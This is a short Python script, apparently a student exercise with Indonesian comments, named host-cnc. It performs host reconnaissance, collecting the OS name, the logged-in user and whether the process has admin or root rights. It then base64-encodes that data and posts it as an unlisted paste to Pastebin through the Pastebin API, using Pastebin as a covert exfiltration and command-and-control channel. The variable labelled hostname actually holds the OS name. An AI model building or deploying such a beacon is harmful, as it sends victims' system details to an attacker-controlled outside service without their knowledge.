# 2301894155 - Valentino Nooril

import os
import ctypes
import base64
import requests
from getopt import getopt
import sys

FLAG = -1
USERNAME = ""
PASSWORD = ""

# Fungsi send ke pastebin
def send(encoded):
    # inisiasi variabel untuk mendapatkan user_key
    dev_key = "[key]"
    login_url = "https://pastebin.com/api/api_login.php"
    login_payload = {
        "api_dev_key": dev_key,
        "api_user_name": USERNAME,
        "api_user_password": PASSWORD
    }

    # post request untuk mendapatkan user_key
    login_request = requests.post(login_url, login_payload)

    user_key = login_request.text
    # print(user_key)
    # print(login_request.status_code)

    # inisiasi variabel untuk upload
    paste_url = "https://pastebin.com/api/api_post.php"
    paste_private = 1
    paste_name = "host-cnc"
    expire_date = "1W"
    input_text = encoded
    # membuat sebuah payload berisikan value-value yang dibutuhkan
    # value yang harus ada adalah 
    # "api_option" digunakan untuk operasi yang dibutuhkan yakni paste 
    # "api_dev_key" digunakan untuk mengetahui user yang terhubung
    # "api_paste_code" berisikan string yang akan dimuat dalam paste
    # Selain itu, beberapa penjelasan mengenai value opsional
    # "api_user_key" digunakan untuk dapat menaruh paste dalam directory milik akun yang terautentikasi
    # "api_paste_private" digunakan untuk visibility paste, nilai 1 merupakan unlisted
    # "api_paste_name" digunakan untuk memberikan nama pada paste
    # "api_paste_expire_date" digunakan untuk memberikan durasi paste dapat diakses
    # "api_folder_key" digunakan untuk menyimpan paste ke dalam folder
    payload = {
        "api_option" : "paste",
        "api_dev_key": dev_key,
        "api_paste_code": input_text,
        "api_user_key": user_key,
        "api_paste_private": paste_private,
        "api_paste_name": paste_name,
        "api_paste_expire_date": expire_date,
        "api_folder_key": "test",
    }
    # mengirimkan request ke pastebin dengan payload yang sudah dibuat
    request = requests.post(paste_url, payload)
    # menampilkan link pastebin yang telah direquest
    print(request.text)

# Fungsi encode untuk mengubah value yang diterima menjadi sebuah string 
def encode(hostname, username, is_admin):
    # Membuat variabel dengan isi dari parameter
    string = f"Hostname:{hostname}\nUsername:{username}\nAdminPriv:{is_admin}\n"
    # Mengubah variabel dengan tipe string menjadi bytes
    string = string.encode()
    # Mengubah variabel bytes menjadi base64
    string = base64.b64encode(string)
    # memanggil fungsi send untuk mengirimkan hasil string yang telah di-encode 
    send(string)
    pass

#Fungsi scan untuk reconnaisance
def scan():
    #inisiasi variable yang dicari
    hostname = ""
    user = ""
    is_admin = -1

    # mengambil host name
    hostname = os.name
    # mengambil user yang terlogin saat script dieksekusi
    user = os.getlogin()

    # kondisi untuk mengetahui privilege
    if FLAG == 10:
        # windows
        is_admin = (ctypes.windll.shell32.IsUserAnAdmin() != 0)
    else:
        # linux/unix
        is_admin = (os.getuid() == 0)
    #fungsi akan mengirim nilai tersebut untuk di-encode
    encode(hostname, user, is_admin)

# Fungsi main
def main():
    global FLAG, USERNAME, PASSWORD
    # Mengambil username dan password dari argumen ketika menjalankan script host-cnc.py
    opts, _ = getopt(sys.argv[1:], "u:p:", ["username=", "password="])
    for key, value in opts:
        if key in ["-u", "--username"]:
            USERNAME = value
        elif key in ["-p", "--password"]:
            PASSWORD = value

    if USERNAME == "" or PASSWORD == "":
        sys.exit()

    # mengecek Operating System ketika script host-cnc.py dieksekusi
    if os.name == 'nt':
        #windows
        FLAG = 10
    else:
        #linux/unix (posix)
        FLAG = 20
    #terakhir main memanggil fungsi scan untuk reconnaisance
    scan()


if __name__ == "__main__":
    main()